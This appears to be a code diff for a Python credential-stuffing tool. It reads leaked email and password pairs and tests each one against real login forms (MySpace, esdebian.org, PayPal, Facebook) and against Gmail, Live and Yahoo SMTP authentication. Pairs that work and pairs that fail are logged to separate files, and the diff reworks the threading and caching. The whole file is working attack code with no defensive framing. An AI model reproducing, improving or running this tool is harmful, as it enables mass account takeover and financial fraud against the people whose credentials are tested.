@@ -1,9 +1,9 @@
 #!/usr/bin/env python
 #-*- coding: UTF-8 -*-
 
-from browser import BROWSER
 from debug import debug
-from decoradores import Retry, Async, Verbose
+from decoradores import Retry, Verbose, Async, nothreadsafe
+from multiprocessing import Process
 from functools import wraps
 import debug as Debug
 import os
@@ -19,12 +19,41 @@ VERBOSE = 0
 
 class Discovers(list):
     def __call__(self, func):
-        self.append(func)
-        return func
+        
+        funcname = func.func_name
+        truesname = funcname + ".txt"
+        falsesname = "no-" + funcname + ".txt"
+        nonesname = "none-" + funcname + ".txt"
+
+        trues = set(read(truesname))
+        falses = set(read(falsesname))
+
+        @Async
+        @Verbose(VERBOSE)
+        @wraps(func)
+        def dfunc(*args, **kwargs):
+            if args in trues:
+                result = True
+            elif args in falses:
+                result = False
+            else:
+                result = func(*args, **kwargs)
+                line = ";".join(args)
+                if result:
+                    write(line, truesname)
+                elif result is not None:
+                    write(line, falsesname)
+                else:
+                    write(line, nonesname)
+            if result:
+                debug("%s: %s, %s" % (funcname, args[0], args[1]))
+
+        self.append(dfunc)
+        return dfunc
 
 discovers = Discovers()
 
-
+@Verbose(VERBOSE)
 def write(text, destination):
     f = open(destination, "a")
     f.write("%s\n" % text)
@@ -41,36 +70,6 @@ def read(filename):
     return pairs
 
 
-def cache(func):
-    funcname = func.func_name
-    truesname = funcname + ".txt"
-    falsesname = "no-" + funcname + ".txt"
-    nonesname = "none-" + funcname + ".txt"
-
-    trues = set(read(truesname))
-    falses = set(read(falsesname))
-
-    @wraps(func)
-    @Verbose(VERBOSE)
-    def dfunc(*args, **kwargs):
-        if args in trues:
-            result = True
-        elif args in falses:
-            result = False
-        else:
-            result = func(*args, **kwargs)
-            line = ";".join(args)
-            if result:
-                write(line, truesname)
-            elif result is not None:
-                write(line, falsesname)
-            else:
-                write(line, nonesname)
-        if result:
-            debug("%s: %s, %s" % (funcname, args[0], args[1]))
-
-    return dfunc
-
 
 def ismail(user):
     if re.search(
@@ -85,12 +84,16 @@ def ismail(user):
 
 
 @discovers
+@nothreadsafe
 def myspace(user, password):
     if ismail(user):
+        import browser
+        b = browser.BROWSER()
         b.clear_cookies()
         form = b.get_forms("http://myspace.com")[1]
         form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Email_Textbox"""] = user
-        form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Password_Textbox"""] = password
+        form["""ctl00$ctl00$cpMain$cpMain"""
+            """$LoginBox$Password_Textbox"""] = password
         try:
             code, title = form.submit()
             if code == 200:
@@ -107,8 +110,11 @@ def myspace(user, password):
 
 
 @discovers
+@nothreadsafe
 def esdebian(user, password):
     if ismail(user):
+        import browser
+        b = browser.BROWSER()
         b.clear_cookies()
         form = b.get_forms("http://www.esdebian.org")[1]
         form["name"] = user
@@ -129,8 +135,11 @@ def esdebian(user, password):
 
 
 @discovers
+@nothreadsafe
 def paypal(user, password):
     if ismail(user):
+        import browser
+        b = browser.BROWSER()
         b.clear_cookies()
         form = b.get_forms("https://www.paypal.com/ar/cgi-bin/webscr"
             "?cmd=_login-run")[1]
@@ -156,8 +165,11 @@ def paypal(user, password):
 
 
 @discovers
+@nothreadsafe
 def facebook(user, password):
     if ismail(user):
+        import browser
+        b = browser.BROWSER()
         b.clear_cookies()
         form = b.get_forms("http://facebook.com")[0]
         form["email"] = user
@@ -178,9 +190,6 @@ def facebook(user, password):
 
 
 @discovers
-@Async
-@Verbose(VERBOSE)
-@cache
 def gmail(user, password):
     if ismail(user):
         smtp = smtplib.SMTP()
@@ -204,9 +213,6 @@ def gmail(user, password):
 
 
 @discovers
-@Async
-@Verbose(VERBOSE)
-@cache
 def live(user, password):
     if ismail(user):
         smtp = smtplib.SMTP()
@@ -230,9 +236,6 @@ def live(user, password):
 
 
 @discovers
-@Async
-@Verbose(VERBOSE)
-@cache
 def yahoo(user, password):
     if ismail(user) and "@yahoo." in user:
         smtp = smtplib.SMTP()
@@ -257,7 +260,7 @@ def main():
     
     stdin = sys.stdin.readlines()
 
-    threads = 40
+    threads = 5
     pause = .1
     slots = [None] * threads
     for line in stdin:
@@ -265,20 +268,19 @@ def main():
         user = user.lower()
 
         for discover in discovers:
-            if isinstance(discover, Async):
-                passed = False
-                tries = 0
-                while not passed:
-                    tries += 1
-                    for pos in xrange(threads):
-                        if slots[pos] is None or not slots[pos].is_alive():
-                            slots[pos] = discover(user, password)
-                            passed = True
-                            break
-                    time.sleep(pause)
-                pause *= tries ** 0.2 * .9
-                if tries > 10:
-                    pause = pause * 10 + 0.001
+            passed = False
+            tries = 0
+            while not passed:
+                tries += 1
+                for pos in xrange(threads):
+                    if slots[pos] is None or not slots[pos].is_alive():
+                        slots[pos] = discover(user, password)
+                        passed = True
+                        break
+                time.sleep(pause)
+            pause *= tries ** 0.2 * .9
+            if tries > 10:
+                pause = pause * 10 + 0.001
 
     for slot in slots:
         if slot is not None:
@@ -287,5 +289,4 @@ def main():
     debug(">>> EOF !!")
 
 if __name__ == "__main__":
-    b = BROWSER()
     exit(main())
